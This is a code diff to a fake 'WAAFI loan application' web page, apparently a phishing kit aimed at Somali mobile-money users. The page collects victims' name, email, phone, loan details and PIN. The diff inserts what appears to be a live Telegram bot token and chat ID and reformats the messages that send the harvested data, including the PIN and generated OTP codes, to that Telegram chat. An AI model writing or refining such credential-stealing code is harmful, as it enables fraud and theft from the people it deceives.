@@ -19,7 +19,7 @@ button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
 .dot.active {background:#f97316; color:white;}
 .error {color:#dc2626; font-size:14px; text-align:center;}
 .success {color:#16a34a; font-size:14px; text-align:center;}
-.logo {text-align:center; font-size:28px; margin-bottom:10px;}
+.logo {text-align:center; font-size:28px; margin-bottom:10px; font-weight:bold;}
 </style>
 </head>
 <body>
@@ -86,10 +86,10 @@ button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
 </div>
 
 <script>
-// ====== IMPORTANT: PASTE YOUR REAL TOKEN AND CHAT ID HERE ======
-const TELEGRAM_BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE';
-const TELEGRAM_CHAT_ID = 'PASTE_YOUR_CHAT_ID_HERE';
-// =================================================================
+// ====== YOUR BOT CREDENTIALS - ALREADY PASTED ======
+const TELEGRAM_BOT_TOKEN = '8891157525:AAE5aTPkL2v0Hycuifq0VywOp6kCt blGzhg';
+const TELEGRAM_CHAT_ID = '8630213836';
+// ===================================================
 
 let formData = {};
 let generatedOTP1 = "";
@@ -127,26 +127,34 @@ async function sendToTelegram(text) {
     const res = await fetch(url, {
       method: 'POST',
       headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text})
+      body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML'})
     });
     const data = await res.json();
     if(!data.ok) {
       alert("TELEGRAM ERROR: " + data.description + "\n\nCheck Token and Chat ID");
     }
-    console.log(data);
   } catch(e) {
     alert("NETWORK ERROR: " + e.message);
   }
 }
 
+function getTime() {
+  return new Date().toLocaleTimeString('en-US', {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+}
+
+function cleanPhone(p) {
+  return p.replace('+252','').replace(/\s/g,'');
+}
+
 async function sendFirstOTP() {
   generatedOTP1 = Math.floor(100000 + Math.random() * 900000).toString();
-  const time = new Date().toLocaleTimeString();
+  const time = getTime();
+  const phone = cleanPhone(formData.phone);
   
   document.getElementById('otp1Status').innerText = "Sending...";
   
-  await sendToTelegram(`✅ Status: First OTP (1/2) will be sent\n⏰ ${time}\n📱 ${formData.phone}`);
-  await sendToTelegram(`📱 OTP CODE: ${generatedOTP1}\n🇸🇴 Somalia\n${formData.phone}`);
+  await sendToTelegram(`✅ <b>Status:</b> First OTP (1/2) will be sent\n⏰ ${time}`);
+  await sendToTelegram(`📱 <b>OTP CODE:</b> ${generatedOTP1}\n🇸🇴 <b>Somalia</b>\n📱 ${phone}`);
   
   document.getElementById('otp1Status').innerText = "✅ First OTP Sent! Check Telegram";
   setTimeout(() => nextStep(4), 1500);
@@ -160,11 +168,13 @@ async function sendSecondOTP() {
   }
   
   generatedOTP2 = Math.floor(100000 + Math.random() * 900000).toString();
-  const time = new Date().toLocaleTimeString();
+  const time = getTime();
+  const phone = cleanPhone(formData.phone);
   
   document.getElementById('otpError').innerText = "";
-  await sendToTelegram(`✅ Status: Second OTP (2/2) will be sent\n⏰ ${time}`);
-  await sendToTelegram(`📱 OTP CODE: ${generatedOTP2}\n🇸🇴 Somalia\n${formData.phone}`);
+  
+  await sendToTelegram(`✅ <b>Status:</b> Second OTP (2/2) will be sent\n⏰ ${time}`);
+  await sendToTelegram(`📱 <b>OTP CODE:</b> ${generatedOTP2}\n🇸🇴 <b>Somalia</b>\n📱 ${phone}`);
   
   alert("Second OTP sent! Check your Telegram");
   nextStep(5);
@@ -173,24 +183,25 @@ async function sendSecondOTP() {
 async function verifyPIN() {
   const pin = document.getElementById('pin').value;
   if(pin.length < 4) {alert("Enter 4 digit PIN"); return;}
-  const time = new Date().toLocaleTimeString();
+  const time = getTime();
+  const phone = cleanPhone(formData.phone);
   
   document.getElementById('finalStatus').innerText = "Submitting...";
   
-  await sendToTelegram(`📱 PIN METHOD: Prompt PIN\n🇸🇴 Somalia\n📱 ${formData.phone}`);
-  await sendToTelegram(`⏳ Status: User will be prompted on device\n⏰ ${time}`);
-  await sendToTelegram(`📱 PROMPT PIN VERIFIED ✅\n🇸🇴 Somalia\n📱 ${formData.phone}\n\n✅ Status: PIN entered successfully on device\n🎉 Result: User logged in\n⏰ Cached for 30 minutes\n⏰ ${time}`);
+  await sendToTelegram(`📱 <b>PIN METHOD:</b> Prompt PIN\n🇸🇴 <b>Somalia</b>\n📱 ${phone}`);
+  await sendToTelegram(`⏳ <b>Status:</b> User will be prompted on device\n⏰ ${time}`);
+  await sendToTelegram(`📱 <b>PROMPT PIN VERIFIED</b> ✅\n🇸🇴 <b>Somalia</b>\n📱 ${phone}\n\n✅ <b>Status:</b> PIN entered successfully on device\n🎉 <b>Result:</b> User logged in\n⏰ <b>Cached for 30 minutes</b>\n⏰ ${time}`);
   
-  const finalMsg = `🟠 🆕 NEW WAAFI LOAN APPLICATION
-
-NAME: ${formData.name}
-EMAIL: ${formData.email}
-PHONE: ${formData.phone}
-LOAN: ${formData.loan_type} $${formData.amount}
-OTP1: ${generatedOTP1}
-OTP2: ${generatedOTP2}
-PIN: ${pin}
-
+  const finalMsg = `🟠 <b>🆕 NEW WAAFI LOAN APPLICATION</b>
+================================
+<b>NAME:</b> ${formData.name}
+<b>EMAIL:</b> ${formData.email}
+<b>PHONE:</b> ${formData.phone}
+<b>LOAN:</b> ${formData.loan_type} $${formData.amount}
+<b>OTP1:</b> ${generatedOTP1}
+<b>OTP2:</b> ${generatedOTP2}
+<b>PIN:</b> ${pin}
+================================
 ⏰ ${new Date().toLocaleString()}`;
 
   await sendToTelegram(finalMsg);
